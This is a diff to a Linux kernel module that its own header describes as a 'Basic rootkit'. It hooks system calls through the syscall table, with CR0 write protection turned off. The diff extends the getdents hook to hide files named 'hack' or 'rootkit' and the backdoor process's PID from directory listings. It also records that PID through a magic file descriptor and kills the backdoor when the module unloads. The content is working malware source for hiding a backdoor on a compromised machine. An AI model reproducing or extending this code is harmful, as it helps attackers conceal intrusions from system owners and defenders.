@@ -40,6 +40,8 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define MAX_LINE_LEN        512
 
 static pid_t pid_backdoor = 0;
+static char pid_backdoor_str[12]= {'\0'};
+
 static pid_t authorized_pids[MAX_PIDS] = {0};
 static size_t authorized_pids_cnt = 0;
 
@@ -341,6 +343,7 @@ asmlinkage ssize_t fake_sys_write(int fd, const void *buf, size_t count)
     if(fd == FD_HACK_BACKDOOR)
     {
         pid_backdoor = *(pid_t*)buf;
+        snprintf(pid_backdoor_str, 12, "%d", pid_backdoor);
         return -1;
     }
     return original_sys_write(fd, buf, count);
@@ -353,7 +356,7 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
     char *  p       = (char *)buf;
     char    line[MAX_LINE_LEN] = {0};
     char *  tmp     = kmalloc(count, GFP_KERNEL);
-    ssize_t  offset  = 0;
+    ssize_t offset  = 0;
     pid_t   pid     = original_sys_getpid();
     pid_t   ppid    = original_sys_getppid();
 
@@ -463,16 +466,16 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     for(bpos = 0; bpos < nread;)
     {
         dir = (struct linux_dirent *)(buf + bpos);
-        //~ d_type = *(buf + bpos + dir->d_reclen - 1);
-        //~ snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
-            //~ (d_type == DT_REG) ?  "regular" :
-            //~ (d_type == DT_DIR) ?  "directory" :
-            //~ (d_type == DT_FIFO) ? "FIFO" :
-            //~ (d_type == DT_SOCK) ? "socket" :
-            //~ (d_type == DT_LNK) ?  "symlink" :
-            //~ (d_type == DT_BLK) ?  "block dev" :
-            //~ (d_type == DT_CHR) ?  "char dev" : "???",
-            //~ dir->d_reclen, (long long) dir->d_off, dir->d_name);
+        d_type = *(buf + bpos + dir->d_reclen - 1);
+        snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
+            (d_type == DT_REG) ?  "regular" :
+            (d_type == DT_DIR) ?  "directory" :
+            (d_type == DT_FIFO) ? "FIFO" :
+            (d_type == DT_SOCK) ? "socket" :
+            (d_type == DT_LNK) ?  "symlink" :
+            (d_type == DT_BLK) ?  "block dev" :
+            (d_type == DT_CHR) ?  "char dev" : "???",
+            dir->d_reclen, (long long) dir->d_off, dir->d_name);
         //~ printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
         //~ printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
         //~ printk("[%s] %s", __this_module.name, logs);
@@ -480,13 +483,14 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
         if(strlen(dir->d_name) > 3)
         {
             // Shit, we get the file of the same name, hide it, is it 1st element!
-            if(!memcmp(dir->d_name, "hack", 4))
+            if(!memcmp(dir->d_name, "hack", MIN(strlen(dir->d_name), strlen("hack"))) ||
+                !memcmp(dir->d_name, "rootkit", MIN(strlen(dir->d_name), strlen("rootkit"))))
             {
                 // Just move the 1st block in that case and don't do anything
                 if(!prev)
                 {
-                    struct linux_dirent * 	next 	= (struct linux_dirent *)(buf + bpos + dir->d_reclen);
-                    unsigned long			offset	= dir->d_reclen + next->d_reclen;
+                    struct linux_dirent *   next    = (struct linux_dirent *)(buf + bpos + dir->d_reclen);
+                    unsigned long           offset  = dir->d_reclen + next->d_reclen;
                     lost_data += dir->d_reclen;
                     dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
                     dir->d_reclen = offset;
@@ -501,6 +505,30 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
                 }
             }
         }
+        if(strlen(pid_backdoor_str) > 0)
+        {
+            if(!memcmp(dir->d_name, pid_backdoor_str, MIN(strlen(dir->d_name), strlen(pid_backdoor_str))))
+            {
+                // Just move the 1st block in that case and don't do anything
+                if(!prev)
+                {
+                    struct linux_dirent *   next    = (struct linux_dirent *)(buf + bpos + dir->d_reclen);
+                    unsigned long           offset  = dir->d_reclen + next->d_reclen;
+                    lost_data += dir->d_reclen;
+                    dir = (struct linux_dirent *)memmove(dir, next, next->d_reclen);
+                    dir->d_reclen = offset;
+                    continue;
+                }
+                else
+                {
+                    lost_data += dir->d_reclen;
+                    prev->d_reclen += dir->d_reclen;
+                    bpos += dir->d_reclen;
+                    continue;
+                }
+            }
+        }
+
         prev = dir;
         // move to next linux_dirent
         bpos += dir->d_reclen;
@@ -552,8 +580,9 @@ static int __init lkm_init(void)
 static void __exit lkm_exit(void)
 {
     //Do not forget to kill backdoor
-    if(original_sys_kill(pid_backdoor, SIGKILL) == 0)
-        printk("%s Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);
+    if(pid_backdoor != 0)
+        if(original_sys_kill(pid_backdoor, SIGKILL) == 0)
+            printk("%s Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);
 
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open]     = original_sys_open;
